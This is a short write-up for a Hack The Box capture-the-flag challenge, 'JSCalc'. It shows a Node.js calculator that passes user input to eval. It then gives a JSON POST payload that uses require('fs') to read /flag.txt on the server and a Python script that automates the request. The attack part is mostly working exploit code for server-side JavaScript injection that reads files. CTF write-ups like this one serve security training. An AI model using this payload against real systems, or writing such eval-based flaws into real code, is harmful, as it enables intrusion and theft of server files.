#  JSCalc: HTB Challenge 

__________________________________________

### Vulnerability
Command injection via `eval`. 
Unpriviledged user can supply data which will be executed on the server.

Vulnerable code:
```js
// /helper/calculatorHelper.js
module.exports = {
    calculate(formula) {
        try {
            return eval(`(function() { return ${ formula } ;}())`);

        } catch (e) {
            if (e instanceof SyntaxError) {
                return 'Something went wrong!';
            }
        }
    }
}
```

### Exploit

The App is making a POST request to the /api/calculate endpoint.
The request is made in json and the **eval()** function is not sanitized so we can pass almost whatever we want.

We need to retrieve the flag, so this is the POST request to get it.
This article explain well why this work:
https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44
```http
POST /api/calculate HTTP/1.1
Host: 127.0.0.1:1337
Content-Type: application/json
...

{"formula":"require('fs').readFileSync('/flag.txt').toString('utf8')"}
```

### Python Script

Simple python script to automate the steps and get the flag
```python
import requests
import json
import sys

if len(sys.argv) != 2:
    print("Usage: python3 script.py <URL>")
    sys.exit(1)

url = sys.argv[1] + "/api/calculate"

if not url.startswith('http://') and not url.startswith('https://'):
    url = 'http://' + url

# JSON payload.
payload = {"formula":"require('fs').readFileSync('/flag.txt').toString('utf8')"}
payload_json = json.dumps(payload)

# Define the header: "Content-Type: application/json".
headers = {'Content-Type': 'application/json'}

# Send the request
try:
    response = requests.post(url, data=payload_json, headers=headers)

    if response.status_code == 200:
        data = json.loads(response.text)
        output = f'{{{data["message"].strip()}}}'
        print("Got The Flag")
        print(output)
    else:
        print(f'Errore {response.status_code}: POST request failed.')
except requests.exceptions.RequestException as e:
    print(f'Errore nella richiesta: {e}')

```